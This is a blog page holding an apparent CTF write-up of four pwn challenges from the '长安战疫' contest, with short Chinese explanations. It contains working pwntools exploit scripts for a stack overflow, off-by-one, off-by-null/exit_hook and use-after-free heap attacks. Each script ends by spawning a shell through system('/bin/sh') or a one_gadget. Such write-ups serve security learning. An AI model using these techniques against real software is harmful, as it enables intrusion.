@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="长安战疫pwn wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="长安战疫pwn">
+<meta property="og:url" content="http://example.com/2022/01/09/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABpwn/index.html">
+<meta property="og:site_name" content="ABf1ag&#39;s blog">
+<meta property="og:description" content="长安战疫pwn wp">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s4.ax1x.com/2022/01/09/7Fg7qg.png">
+<meta property="og:image" content="https://s4.ax1x.com/2022/01/09/7FgLIs.png">
+<meta property="og:image" content="https://s4.ax1x.com/2022/01/09/7Fgqaj.png">
+<meta property="og:image" content="https://s4.ax1x.com/2022/01/09/7FgbZQ.png">
+<meta property="article:published_time" content="2022-01-09T06:58:24.000Z">
+<meta property="article:modified_time" content="2022-01-09T07:24:22.308Z">
+<meta property="article:author" content="ABf1ag">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s4.ax1x.com/2022/01/09/7Fg7qg.png">
+
+<link rel="canonical" href="http://example.com/2022/01/09/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABpwn/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>长安战疫pwn | ABf1ag's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ABf1ag's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section">Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section">Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section">links</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/09/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABpwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ABf1ag">
+      <meta itemprop="description" content="CTF to learn,not learn to CTF">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ABf1ag's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          长安战疫pwn
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-01-09 14:58:24 / Modified: 15:24:22" itemprop="dateCreated datePublished" datetime="2022-01-09T14:58:24+08:00">2022-01-09</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="长安战疫pwn-wp"><a href="#长安战疫pwn-wp" class="headerlink" title="长安战疫pwn wp"></a>长安战疫pwn wp</h3><span id="more"></span>
+
+<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>pwn签到题，唯一有点坑就是在出函数时并不仅仅是leave；ret，而是多出了两行汇编代码。因此需要我们分析和调试一下。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/7Fg7qg"><img src="https://s4.ax1x.com/2022/01/09/7Fg7qg.png" alt="7Fg7qg.png"></a></p>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;pwn1&#x27;)</span><br><span class="line">io.recvuntil(&quot;:&quot;)</span><br><span class="line">stack = int(io.recv(10),16)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(&#x27;a&#x27;*0x30+p32(0x8048540)+p32(stack+0x34))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>libc-2.27的off-by-one，细心一点就能发现for循环这块会让我们多输入一个字节。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/7FgLIs"><img src="https://s4.ax1x.com/2022/01/09/7FgLIs.png" alt="7FgLIs.png"></a></p>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./pwn2&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn2&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">	io.sendlineafter(&#x27;Choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;size: &#x27;,str(size))</span><br><span class="line">	io.sendafter(&#x27;content: &#x27;,content)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">	io.sendlineafter(&#x27;Choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line">	io.sendlineafter(&#x27;content: &#x27;,content)</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">	io.sendlineafter(&#x27;Choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	io.sendlineafter(&#x27;Choice: &#x27;,&#x27;4&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">	add(0xf8,&#x27;f1ag\n&#x27;)#0</span><br><span class="line">	add(0xf8,&#x27;f1ag\n&#x27;)#1</span><br><span class="line">	add(0xf8,&#x27;f1ag\n&#x27;)#2</span><br><span class="line">	add(0xf8,&#x27;f1ag\n&#x27;)#3</span><br><span class="line">	add(0x18,&#x27;f1ag\n&#x27;)#4</span><br><span class="line">	dele(2)</span><br><span class="line">	add(0xf8,&#x27;a&#x27;*0xf0+p64(0x300)+&#x27;\n&#x27;)#2</span><br><span class="line"></span><br><span class="line">	for i in range(7):</span><br><span class="line">		add(0xf8,&#x27;a\n&#x27;)#5~11</span><br><span class="line">	for i in range(7):</span><br><span class="line">		dele(11-i)</span><br><span class="line">	</span><br><span class="line">	dele(0)</span><br><span class="line">	gdb.attach(io)</span><br><span class="line">	dele(3)</span><br><span class="line">	for i in range(7):</span><br><span class="line">		add(0xf8,&#x27;f1ag\n&#x27;)#0,3,5~9</span><br><span class="line">	add(0xf8,&#x27;f1ag\n&#x27;)#10</span><br><span class="line">	show(1)</span><br><span class="line">	malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">	libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">	print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">	free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line">	system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line"></span><br><span class="line">	add(0xf8,&#x27;f1ag\n&#x27;)#11=1</span><br><span class="line">	dele(1)</span><br><span class="line">	edit(11,p64(free_hook-8)+&#x27;\n&#x27;)</span><br><span class="line">	add(0xf8,&#x27;f1ag\n&#x27;)#1</span><br><span class="line">	add(0xf8,&#x27;/bin/sh\x00&#x27;+p64(system)+&#x27;\n&#x27;)#12</span><br><span class="line">	dele(12)</span><br><span class="line">	io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>这个题利用的是strcpy、strcat等一些对字符串操作的函数的漏洞，当他们复制字符串的时候会把字符串的最后一个字节\x00给带上，极容易造成off-by-null漏洞。而这个题的漏洞点正在于此，\x00正好将存放长度的地址覆盖置0，就可以将长度的值改写为一个很大的值，打败boss进入到奖励函数中。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/7Fgqaj"><img src="https://s4.ax1x.com/2022/01/09/7Fgqaj.png" alt="7Fgqaj.png"></a></p>
+<p>因为有exit函数，很容易联想到打exit_hook。[exit_hook的知识点]( <a target="_blank" rel="noopener" href="https://blackbird-bb.github.io/2021/05/20/PWN%E5%AD%A6%E4%B9%A0%E2%80%94exit-hook-%E5%81%B7%E5%AE%B6/">PWN学习—exit_hook-偷家 - BlackBird’s Blog (blackbird-bb.github.io)</a> ) 参考这位西电大佬写的博客，然后直接打onegadget就ok了。在打one_gadget的时候正常出来的四个gadget不能打通，这时候在one_gadget后加上-l2可以找到更多的gadget。</p>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./Gpwn3&#x27;)</span><br><span class="line">io=remote(&#x27;127.0.0.1&#x27;,10002)</span><br><span class="line">elf=ELF(&#x27;./Gpwn3&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def create(description):</span><br><span class="line">	io.sendlineafter(&#x27;choice:&#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendafter(&#x27; level :\n&#x27;,description)</span><br><span class="line"></span><br><span class="line">def power(description):</span><br><span class="line">	io.sendlineafter(&#x27;choice:&#x27;,&#x27;2&#x27;)</span><br><span class="line">	io.sendafter(&#x27;another level :&#x27;,description)	</span><br><span class="line"></span><br><span class="line">def beat():	</span><br><span class="line">	io.sendlineafter(&#x27;choice:&#x27;,&#x27;3&#x27;)</span><br><span class="line"></span><br><span class="line">def give_up():</span><br><span class="line">	io.sendlineafter(&#x27;choice:&#x27;,&#x27;4&#x27;)</span><br><span class="line">		 </span><br><span class="line">def exp():</span><br><span class="line">	create(&#x27;a&#x27;*35+&#x27;\n&#x27;)</span><br><span class="line">	power(&#x27;a&#x27;)</span><br><span class="line">	power(&#x27;\xff\xff\xff\xff&#x27;)</span><br><span class="line">	beat()</span><br><span class="line">	</span><br><span class="line">	io.recvuntil(&#x27;reward: &#x27;)</span><br><span class="line">	puts=int(io.recv(14),16)</span><br><span class="line">	libc_base=puts-libc.symbols[&#x27;puts&#x27;]	</span><br><span class="line">	print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">	system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">	binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">	dl_rtld_unlock_recursive = libc_base+0x5f0040+3856</span><br><span class="line">	gadget=[0x45226,0x4527a,0xf03a4,0xf1247,0xcd173,0xcd248,0xf03b0,0xf67f0]</span><br><span class="line">	#gdb.attach(io)</span><br><span class="line">	io.sendafter(&#x27;your name:&#x27;,p64(dl_rtld_unlock_recursive))</span><br><span class="line">	</span><br><span class="line">	io.sendafter(&#x27;for you!&#x27;,p64(gadget[7]+libc_base))</span><br><span class="line">	io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><p>这个题有个小问题，忘了在add函数后加break跳出switch，因此有师傅修switch时修不出来add，只能看汇编代码，在这里和各位师傅道个歉。</p>
+<p>此题的漏洞在free时没有对指针置0，libc-2.31的uaf。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/7FgbZQ"><img src="https://s4.ax1x.com/2022/01/09/7FgbZQ.png" alt="7FgbZQ.png"></a></p>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./pwn4&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn4&#x27;)</span><br><span class="line">libc=elf(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(index,name,key,value):</span><br><span class="line">	io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line">	io.sendlineafter(&#x27;Enter your name: &#x27;,name)</span><br><span class="line">	io.sendlineafter(&#x27;Please input a key: &#x27;,key)</span><br><span class="line">	io.sendlineafter(&#x27;Please input a value: &#x27;,str(value))</span><br><span class="line">	</span><br><span class="line">def show(index):</span><br><span class="line">	io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,name,length,key,value):</span><br><span class="line">	io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line">	io.sendlineafter(&#x27;Enter your name: &#x27;,name)</span><br><span class="line">	io.sendlineafter(&#x27;New key length: &#x27;,str(length))</span><br><span class="line">	io.sendlineafter(&#x27;Key: &#x27;,key)</span><br><span class="line">	io.sendlineafter(&#x27;Value: &#x27;,str(value))</span><br><span class="line">	</span><br><span class="line">def dele(index):</span><br><span class="line">	io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;4&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line">	</span><br><span class="line">def exp():</span><br><span class="line">	add(0,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x417,0)</span><br><span class="line">	add(1,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x3c7,1)</span><br><span class="line">	dele(0)</span><br><span class="line">	show(0)</span><br><span class="line">	malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;)) - 96 -16</span><br><span class="line">	libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">	print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">	free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line">	system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line">	</span><br><span class="line">	add(2,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x57,2)</span><br><span class="line">	add(3,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x57,3)</span><br><span class="line">	dele(3)</span><br><span class="line">	dele(2)</span><br><span class="line">	#gdb.attach(io)</span><br><span class="line">	edit(1,&#x27;f1ag&#x27;,8,&#x27;/bin/sh\x00&#x27;,1)</span><br><span class="line">	edit(2,&#x27;f1ag&#x27;,6,p32((free_hook-0x51)&amp;0xffffffff)+p16(((free_hook)&gt;&gt;32)&amp;0xffff),2)</span><br><span class="line">	</span><br><span class="line">	add(4,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x51+p32((system)&amp;0xffffffff)+p16(((system)&gt;&gt;32)&amp;0xffff),&#x27;4&#x27;)</span><br><span class="line">	</span><br><span class="line">	#add(6,&#x27;f1ag&#x27;,p64(system),5)</span><br><span class="line">	</span><br><span class="line">	dele(1)</span><br><span class="line">	io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/07/%E5%AE%89%E6%B4%B5final/" rel="prev" title="安洵final">
+      <i class="fa fa-chevron-left"></i> 安洵final
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2099/06/11/%E6%97%A5%E5%BF%97/" rel="next" title="日志">
+      日志 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABpwn-wp"><span class="nav-number">1.</span> <span class="nav-text">长安战疫pwn wp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn1"><span class="nav-number">2.</span> <span class="nav-text">pwn1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn2"><span class="nav-number">3.</span> <span class="nav-text">pwn2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn3"><span class="nav-number">4.</span> <span class="nav-text">pwn3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn4"><span class="nav-number">5.</span> <span class="nav-text">pwn4</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ABf1ag</p>
+  <div class="site-description" itemprop="description">CTF to learn,not learn to CTF</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ABf1ag</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
